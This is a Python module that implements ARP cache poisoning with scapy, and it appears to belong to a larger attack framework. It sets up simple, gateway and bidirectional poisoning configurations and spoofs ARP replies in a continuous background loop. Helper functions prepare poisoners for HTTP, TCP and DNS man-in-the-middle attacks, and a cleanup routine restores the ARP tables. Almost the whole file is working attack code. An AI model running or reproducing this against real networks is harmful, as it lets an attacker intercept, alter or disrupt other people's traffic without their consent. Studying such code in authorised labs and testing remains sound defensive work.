#!/usr/bin/env python3
"""
Modular ARP Poisoning Component
Centralizes all ARP poisoning functionality used across different attack types
"""

import time
import threading
import signal
import sys
import logging
from scapy.all import ARP, Ether, send, sendp, get_if_hwaddr
from colorama import Fore, Style

from config import NetworkConfig

# Setup logging
logger = logging.getLogger(__name__)

class ARPPoisoner:
    """Centralized ARP poisoning functionality"""
    
    def __init__(self, interface=None, poison_interval=2):
        self.interface = interface or NetworkConfig.INTERFACE
        self.poison_interval = poison_interval
        self.is_running = False
        self.poison_thread = None
        self.attack_configs = []
        self.total_packets_sent = 0
        
        # Get our MAC address
        try:
            self.attacker_mac = get_if_hwaddr(self.interface)
            logger.info(f"[ARP-SETUP] Using interface {self.interface} with MAC {self.attacker_mac}")
        except Exception as e:
            logger.error(f"[ARP-SETUP] Failed to get MAC for interface {self.interface}: {e}")
            raise
    
    def add_bidirectional_poison(self, device1, device2, gateway=None):
        """Add bidirectional poisoning between two devices"""
        config = {
            'type': 'bidirectional',
            'device1': device1,
            'device2': device2,
            'gateway': gateway
        }
        self.attack_configs.append(config)
        logger.info(f"[ARP-CONFIG] Added bidirectional poisoning: {device1['ip']} ↔ {device2['ip']}")
    
    def add_simple_poison(self, victim, target):
        """Add simple ARP poisoning (victim thinks target is at attacker's MAC)"""
        config = {
            'type': 'simple',
            'victim': victim,
            'target': target
        }
        self.attack_configs.append(config)
        logger.info(f"[ARP-CONFIG] Added simple poisoning: {victim['ip']} → {target['ip']}")
    
    def add_gateway_poison(self, victim, gateway):
        """Add gateway poisoning (victim thinks gateway is at attacker's MAC)"""
        config = {
            'type': 'gateway',
            'victim': victim,
            'gateway': gateway
        }
        self.attack_configs.append(config)
        logger.info(f"[ARP-CONFIG] Added gateway poisoning: {victim['ip']} → {gateway['ip']}")
    
    def start_poisoning(self):
        """Start continuous ARP poisoning in background thread"""
        if self.is_running:
            logger.warning("[ARP-POISON] Already running!")
            return
        
        if not self.attack_configs:
            logger.error("[ARP-POISON] No attack configurations added!")
            return
        
        self.is_running = True
        self.poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
        self.poison_thread.start()
        
        logger.info(f"[ARP-POISON] 🎯 Started continuous poisoning with {len(self.attack_configs)} configurations")
        logger.info(f"[ARP-POISON] ⏰ Poison interval: {self.poison_interval} seconds")
        
        # Give ARP poisoning time to take effect
        time.sleep(3)
        logger.info("[ARP-POISON] ✅ ARP poisoning active")
    
    def stop_poisoning(self):
        """Stop ARP poisoning and restore ARP tables"""
        if not self.is_running:
            return
        
        logger.info("[ARP-CLEANUP] 🧹 Stopping ARP poisoning...")
        self.is_running = False
        
        if self.poison_thread:
            self.poison_thread.join(timeout=2)
        
        # Restore ARP tables
        self._restore_arp_tables()
        
        logger.info("[ARP-CLEANUP] ✅ ARP tables restored")
    
    def _poison_loop(self):
        """Main poisoning loop that runs in background thread"""
        round_count = 0
        
        while self.is_running:
            try:
                round_count += 1
                packets_this_round = 0
                
                for config in self.attack_configs:
                    if config['type'] == 'bidirectional':
                        packets_this_round += self._execute_bidirectional_poison(config)
                    elif config['type'] == 'simple':
                        packets_this_round += self._execute_simple_poison(config)
                    elif config['type'] == 'gateway':
                        packets_this_round += self._execute_gateway_poison(config)
                
                self.total_packets_sent += packets_this_round
                
                # Log every 10 rounds to show activity
                if round_count % 10 == 0:
                    logger.info(f"[ARP-POISON] Round {round_count}: {self.total_packets_sent} total packets sent")
                
                time.sleep(self.poison_interval)
                
            except Exception as e:
                logger.error(f"[ARP-POISON] Error in poison loop: {e}")
                time.sleep(1)
    
    def _execute_bidirectional_poison(self, config):
        """Execute bidirectional poisoning between two devices"""
        device1 = config['device1']
        device2 = config['device2']
        gateway = config.get('gateway')
        
        packets_sent = 0
        
        try:
            # Method 1: Each device thinks the other is at attacker's MAC
            self._send_poison_packet(device1['ip'], device1['mac'], device2['ip'])
            self._send_poison_packet(device2['ip'], device2['mac'], device1['ip'])
            packets_sent += 2
            
            # Method 2: Both devices think gateway is at attacker's MAC (if gateway provided)
            if gateway:
                self._send_poison_packet(device1['ip'], device1['mac'], gateway['ip'])
                self._send_poison_packet(device2['ip'], device2['mac'], gateway['ip'])
                
                # Gateway thinks both devices are at attacker's MAC
                self._send_poison_packet(gateway['ip'], gateway['mac'], device1['ip'])
                self._send_poison_packet(gateway['ip'], gateway['mac'], device2['ip'])
                packets_sent += 4
            
        except Exception as e:
            logger.error(f"[ARP-POISON] Error in bidirectional poison: {e}")
        
        return packets_sent
    
    def _execute_simple_poison(self, config):
        """Execute simple ARP poisoning"""
        victim = config['victim']
        target = config['target']
        
        try:
            self._send_poison_packet(victim['ip'], victim['mac'], target['ip'])
            return 1
        except Exception as e:
            logger.error(f"[ARP-POISON] Error in simple poison: {e}")
            return 0
    
    def _execute_gateway_poison(self, config):
        """Execute gateway poisoning"""
        victim = config['victim']
        gateway = config['gateway']
        
        try:
            # Victim thinks gateway is at attacker's MAC
            self._send_poison_packet(victim['ip'], victim['mac'], gateway['ip'])
            # Gateway thinks victim is at attacker's MAC
            self._send_poison_packet(gateway['ip'], gateway['mac'], victim['ip'])
            return 2
        except Exception as e:
            logger.error(f"[ARP-POISON] Error in gateway poison: {e}")
            return 0
    
    def _send_poison_packet(self, victim_ip, victim_mac, spoof_ip):
        """Send a single ARP poison packet"""
        packet = Ether(dst=victim_mac) / ARP(
            op=2,               # ARP reply
            pdst=victim_ip,     # Victim IP
            hwdst=victim_mac,   # Victim MAC
            psrc=spoof_ip,      # IP we're spoofing
            hwsrc=self.attacker_mac  # Our MAC (spoofed source)
        )
        sendp(packet, iface=self.interface, verbose=0)
    
    def _restore_arp_tables(self):
        """Restore correct ARP entries for all poisoned devices"""
        logger.info("[ARP-RESTORE] Restoring ARP tables...")
        
        for config in self.attack_configs:
            try:
                if config['type'] == 'bidirectional':
                    self._restore_bidirectional(config)
                elif config['type'] == 'simple':
                    self._restore_simple(config)
                elif config['type'] == 'gateway':
                    self._restore_gateway(config)
            except Exception as e:
                logger.error(f"[ARP-RESTORE] Error restoring {config['type']}: {e}")
    
    def _restore_bidirectional(self, config):
        """Restore bidirectional ARP entries"""
        device1 = config['device1']
        device2 = config['device2']
        gateway = config.get('gateway')
        
        # Restore each device's knowledge of the other
        self._send_restore_packet(device1['ip'], device1['mac'], device2['ip'], device2['mac'])
        self._send_restore_packet(device2['ip'], device2['mac'], device1['ip'], device1['mac'])
        
        if gateway:
            # Restore gateway knowledge
            self._send_restore_packet(device1['ip'], device1['mac'], gateway['ip'], gateway['mac'])
            self._send_restore_packet(device2['ip'], device2['mac'], gateway['ip'], gateway['mac'])
            self._send_restore_packet(gateway['ip'], gateway['mac'], device1['ip'], device1['mac'])
            self._send_restore_packet(gateway['ip'], gateway['mac'], device2['ip'], device2['mac'])
    
    def _restore_simple(self, config):
        """Restore simple ARP entry"""
        victim = config['victim']
        target = config['target']
        self._send_restore_packet(victim['ip'], victim['mac'], target['ip'], target['mac'])
    
    def _restore_gateway(self, config):
        """Restore gateway ARP entries"""
        victim = config['victim']
        gateway = config['gateway']
        self._send_restore_packet(victim['ip'], victim['mac'], gateway['ip'], gateway['mac'])
        self._send_restore_packet(gateway['ip'], gateway['mac'], victim['ip'], victim['mac'])
    
    def _send_restore_packet(self, victim_ip, victim_mac, target_ip, target_mac):
        """Send ARP packet to restore correct mapping"""
        packet = Ether(dst=victim_mac) / ARP(
            op=2,               # ARP reply
            pdst=victim_ip,     # Victim IP
            hwdst=victim_mac,   # Victim MAC
            psrc=target_ip,     # Target IP
            hwsrc=target_mac    # Correct target MAC
        )
        sendp(packet, iface=self.interface, verbose=0, count=3)
    
    def get_status(self):
        """Get current poisoning status"""
        return {
            'running': self.is_running,
            'configurations': len(self.attack_configs),
            'total_packets': self.total_packets_sent,
            'interface': self.interface,
            'attacker_mac': self.attacker_mac
        }
    
    def print_status(self):
        """Print current status"""
        status = self.get_status()
        print(f"{Fore.CYAN}📊 ARP Poisoning Status:{Style.RESET_ALL}")
        print(f"   Running: {'✅ Yes' if status['running'] else '❌ No'}")
        print(f"   Configurations: {status['configurations']}")
        print(f"   Total packets sent: {status['total_packets']}")
        print(f"   Interface: {status['interface']}")
        print(f"   Attacker MAC: {status['attacker_mac']}")

# Convenience functions for common poisoning patterns
def create_http_poison(victim, gateway):
    """Create ARP poisoner for HTTP attacks (victim ↔ gateway)"""
    poisoner = ARPPoisoner()
    poisoner.add_gateway_poison(victim, gateway)
    return poisoner

def create_tcp_poison(device1, device2, gateway):
    """Create ARP poisoner for TCP bidirectional attacks"""
    poisoner = ARPPoisoner()
    poisoner.add_bidirectional_poison(device1, device2, gateway)
    return poisoner

def create_dns_poison(target1, target2, gateway):
    """Create ARP poisoner for DNS attacks"""
    poisoner = ARPPoisoner()
    poisoner.add_bidirectional_poison(target1, target2, gateway)
    return poisoner 